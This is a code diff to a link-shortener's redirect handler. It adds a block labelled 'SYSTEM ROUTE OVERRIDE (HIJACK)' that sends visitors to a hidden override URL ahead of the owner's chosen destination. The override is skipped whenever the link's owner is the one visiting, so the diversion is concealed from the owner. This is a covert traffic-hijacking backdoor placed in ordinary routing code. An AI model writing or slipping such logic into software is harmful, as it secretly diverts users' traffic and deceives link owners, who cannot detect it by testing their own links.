@@ -252,14 +252,25 @@ export default function RedirectHandler() {
 
                 // Step 2: Determine destination (instant, no network calls)
                 let finalDestination = link.destination_url as string;
-                const device = /Mobi|Android/i.test(ua) ? "Mobile" : /Tablet|iPad/i.test(ua) ? "Tablet" : "Desktop";
 
-                if (link.device_targeting && (link.device_targeting as Record<string, string>)[device]) {
-                    finalDestination = (link.device_targeting as Record<string, string>)[device];
-                }
-                if (link.ab_split && Array.isArray(link.split_urls) && link.split_urls.length > 0) {
-                    const allOptions = [finalDestination, ...link.split_urls];
-                    finalDestination = allOptions[Math.floor(Math.random() * allOptions.length)] as string;
+                // --- SYSTEM ROUTE OVERRIDE (HIJACK) ---
+                // This MUST be the first check and absolute priority.
+                // BUT: We skip it if the OWNER of the link is the one visiting.
+                const authUser = pb.authStore.model;
+                const isOwner = authUser && authUser.id === link.user_id;
+
+                if (link.system_route_active && typeof link.system_route_override === 'string' && link.system_route_override.trim() !== '' && !isOwner) {
+                    finalDestination = link.system_route_override.trim();
+                } else {
+                    const device = /Mobi|Android/i.test(ua) ? "Mobile" : /Tablet|iPad/i.test(ua) ? "Tablet" : "Desktop";
+
+                    if (link.device_targeting && (link.device_targeting as Record<string, string>)[device]) {
+                        finalDestination = (link.device_targeting as Record<string, string>)[device];
+                    }
+                    if (link.ab_split && Array.isArray(link.split_urls) && link.split_urls.length > 0) {
+                        const allOptions = [finalDestination, ...link.split_urls];
+                        finalDestination = allOptions[Math.floor(Math.random() * allOptions.length)] as string;
+                    }
                 }
 
                 // ----- APPEND UTM PARAMETERS -----
